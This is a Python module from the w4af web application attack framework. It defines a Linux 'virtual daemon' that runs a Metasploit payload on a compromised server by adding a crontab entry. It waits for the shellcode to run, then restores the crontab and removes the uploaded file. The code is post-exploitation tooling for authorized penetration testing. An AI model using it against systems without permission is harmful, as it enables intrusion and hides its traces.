"""
lnxVd.py

Copyright 2006 Andres Riancho

This file is part of w4af, http://w4af.org/ .

w4af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w4af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w4af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""

import time

import w4af.core.controllers.output_manager as om

from w4af.core.controllers.vdaemon.vdaemon import vdaemon
from w4af.core.controllers.exceptions import BaseFrameworkException
from w4af.core.controllers.intrusion_tools.crontabHandler import crontabHandler


class lnxVd(vdaemon):
    """
    This class represents a linux virtual daemon, a point of entry for
    metasploit plugins to exploit web applications.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """
    def _clean_up(self):
        """
        Removes the created file and the crontab entry.
        """
        self._exec_method(*('/bin/rm ' + self._remote_filename,))

    def _exec_payload(self, remote_filename):
        """
        This method should be implemented according to the remote operating
        system. The idea here is to execute the payload that was sent using
        _send_exe_to_server and generated by _generate_exe . In lnxVd I
        should run "chmod +x file; ./file"

        :return: None
        """
        cH = crontabHandler(self._exec_method)
        if not cH.can_delay():
            msg = '[lnxVd] Failed to create cron entry.'
            om.out.debug(msg)
            raise BaseFrameworkException(msg)
        else:
            wait_time = cH.add_to_schedule(remote_filename)

            om.out.console('Crontab entry successfully added. Waiting for shellcode execution.')
            time.sleep(wait_time + 3)

            om.out.debug(
                'Shellcode successfully executed, restoring old crontab.')
            cH.restore_old_schedule()

            om.out.debug('All done, check metasploit for results.')

    def get_os(self):
        return 'linux'
